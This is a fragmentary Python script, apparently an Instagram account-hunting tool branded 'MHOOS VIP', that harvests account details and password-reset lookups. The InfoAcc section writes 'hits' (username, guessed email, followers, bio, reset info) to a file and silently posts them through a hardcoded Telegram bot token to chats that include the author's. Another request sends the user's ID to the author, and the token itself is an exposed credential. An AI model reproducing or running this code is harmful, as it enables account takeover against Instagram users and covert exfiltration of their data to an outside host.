...
took = "7875189417:AAF9TfCEBIx8a28PHQjesHMLbihrQ0lTYlc"
...
an2 = datetime.datetime(4025, 5, 27, 15, 00, 00 )
if an > an2 or an == an2:
        exit("انتهى وقت تفعيل الاداة للأشتراك راسل المطور @MHOOS0")
...
requests.post(f"https://api.telegram.org/bot{took}/sendMessage?chat_id={idd}&text={IDD}")    
...
{cyan}2025/5/27/3:00:00 {white} وقت الانتهاء :
...
eizon_header = render('MHOOS VIP', colors=['white', 'cyan'], align='center')
print("\x1b[1;36m—" * 67)
print(eizon_header)
print(f" 𝐃 : {cyan}@{white}M{cyan}H{white}O{cyan}O{white}S{cyan}0 {white}| 𝐂 : {cyan}@{white}M{cyan}H{white}O{cyan}O{white}S{cyan}0{white}1")
print("\x1b[1;36m—" * 67)

tok = "7875189417:AAF9TfCEBIx8a28PHQjesHMLbihrQ0lTYlc"

io = "5398742663"

ID = "5398742663"
TOKEN = "7875189417:AAF9TfCEBIx8a28PHQjesHMLbihrQ0lTYlc"
try:
    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendvideo?chat_id={ID}&parse_mode=Markdown&video=https://t.me/vedioooo11/3&caption= - By : [𝗠𝗛𝗢𝗢𝗦](t.me/MHOOS01)")
except Exception:
    pass
...
def pppp():
    ...
    be = good_ig            
    print(f'''{white}⠀⠀⠀⠀⠀
⠀⠀{cyan}< {white}𝕄ℍ𝕆𝕆𝕊  {cyan}《ＶＩＰ》>  
{cyan}═════════════════════{cyan}{W1}
{W1}﴾ {green}HIT {W1}➔ {green} {ge} {W1}{W1}﴿ {W1}{W1} ﴾ {magenta}Good {W1}➔ {magenta} {bt} {W1}{W1}﴿ {W1}{W1} ﴾{red} Bad {W1}➔ {red} {be} {W1}{W1}﴿ {W1}{W1}
{cyan}═════════════════════
  TLA ➔{cyan} @ {white}M{cyan}H{white}O{cyan}O{white}S{cyan}0 {white} ''')
...
def rest(user):
    try:
        headers = {
            'X-Pigeon-Session-Id': '559db20a41c72448be8d07156e065c06', '235c9483d007713b45fc75b34c76332d68d579a4300a1db1da94670c3a05089f'
...
'a80c5fb30dfae9e273e4009f03b18280'
                                   'bb343b0862d663f31a3c63f13a9f31c0'
                                   'c80c5fb30dfae9e273e4009f03b18280'
                                   'ab343b0862d663f31a3c63f13a9f31c0'),
...
def InfoAcc(username, domain):
    ...
    total_hits += 1
    info_text = f"""  
❄️ 𝐇𝐈𝐓 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌  
━━━━━━━━━━━━━━━
❄️ 𝗠𝗬 𝗜𝗗 : {ID} 
❄️ 𝐇𝐢𝐭𝐬 : {total_hits} 
❄️ 𝐍𝐚𝐦𝐞 : {username}
❄️ 𝐄𝐦𝐚𝐢𝐥: {username}@{domain}
❄️ 𝐅𝐨𝐥𝐥𝐨𝐰𝐞𝐫𝐬 : {followers}
❄️ 𝐅𝐨𝐥𝐥𝐨𝐰𝐢𝐧𝐠 : {following}
❄️ 𝐏𝐨𝐬𝐭 : {posts}
❄️ 𝐃𝐚𝐭𝐞 : 𝕄ℍ𝕆𝕆𝕊
❄️ 𝐁𝐢𝐨 : {bio}
❄️ 𝐑𝐞𝐬𝐞𝐭 : {rest(username)}
❄️𝗨𝗥𝗟 : https://www.instagram.com/{username}
━━━━━━━━━━━━━━━
❄️ py : @MHOOS0 | https://t.me/MHOOS01
━━━━━━━━━━━━━━━
"""
    with open('MHOOSVIP.txt', 'a') as f:
        f.write(info_text + "\n")
    try:
        requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={info_text}")
        requests.get(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={io}&text={info_text}")
    except Exception:
        pass
...
# ======== خادم Flask في ثريد منفصل ========
def run_flask_server():
    app = Flask(__name__)
    
    @app.route('/')
    def home():
        return "<html><body><h1 style='text-align: center;'>صفحة بيضاء</h1></body></html>"
    
    app.run(host='0.0.0.0', port=8080)

# بدء خادم Flask في ثريد منفصل
